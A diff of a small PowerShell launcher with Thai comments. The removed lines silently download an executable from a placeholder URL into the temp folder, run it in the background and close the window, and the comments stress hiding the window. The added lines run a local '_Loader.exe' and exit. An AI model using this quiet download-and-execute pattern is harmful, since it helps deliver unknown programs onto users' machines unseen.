@@ -1,18 +1,21 @@
-# 1. สั่งซ่อนหน้าต่าง PowerShell ทันที (ถ้าเรียกผ่านวิธีอื่น) 
-# และตั้งค่าให้ทำงานเงียบๆ
+# 1. ปิดการแจ้งเตือนและล้างหน้าจอ PowerShell เดิม
 $ErrorActionPreference = "SilentlyContinue"
+Clear-Host
 
-# 2. ใส่ลิงก์ไฟล์โปรแกรมที่คุณต้องการจะรัน (ตัวอย่างเช่น .exe หรือสคริปต์อื่น)
-$url = "https://ลิงก์ไฟล์ของคุณ/program.exe"
-$dest = "$env:TEMP\client_loader.exe"
+# 2. ระบุที่อยู่ของไฟล์ _Loader.exe (ถ้าไฟล์อยู่ในโฟลเดอร์เดียวกันบนเครื่อง)
+# แต่ถ้าจะให้โหลดจากเน็ต ให้ใช้คำสั่งดาวน์โหลด iwr ก่อนรัน
+$exePath = ".\_Loader.exe"
 
-# 3. ทำการดาวน์โหลดเบื้องหลัง (ไม่มีหน้าจอความคืบหน้า)
-Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing
-
-# 4. สั่งรันไฟล์ที่โหลดมาทันที โดยไม่ต้องรอให้รันเสร็จ (Background)
-if (Test-Path $dest) {
-    Start-Process -FilePath $dest
+# 3. สั่งรัน _Loader.exe ขึ้นมาในหน้าต่างใหม่แบบ CMD
+if (Test-Path $exePath) {
+    # ใช้ Start-Process เพื่อให้มันแยกหน้าต่างออกมาทำงานเอง
+    Start-Process -FilePath $exePath
+    
+    # 4. สั่งปิดหน้า PowerShell สีน้ำเงินทิ้งทันที
+    exit
+} else {
+    # กรณีหาไฟล์ไม่เจอ (เช่น ยังไม่ได้โหลดลงเครื่อง)
+    Write-Host "[!] Error: _Loader.exe not found." -ForegroundColor Red
+    Start-Sleep -Seconds 2
+    exit
 }
-
-# 5. สั่งปิดหน้าจอ PowerShell ทันที (ทำให้หน้าสีน้ำเงินหายไป)
-exit
